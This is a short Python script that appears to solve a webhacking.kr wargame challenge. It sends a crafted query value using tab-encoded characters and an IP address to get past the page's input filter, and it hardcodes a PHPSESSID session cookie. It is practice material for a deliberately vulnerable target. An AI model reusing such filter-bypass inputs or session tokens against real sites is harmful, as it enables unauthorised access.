import requests

cookies = {'PHPSESSID':'hgag9kj1ags7cm627r5mqleubf'}
url = "https://webhacking.kr/challenge/code-2/"
query = "1aaaaa_59.27.124.253%09p%09a%09s%09s"

res = requests.get(url + "?val=" + query, cookies = cookies)
print(res.text)
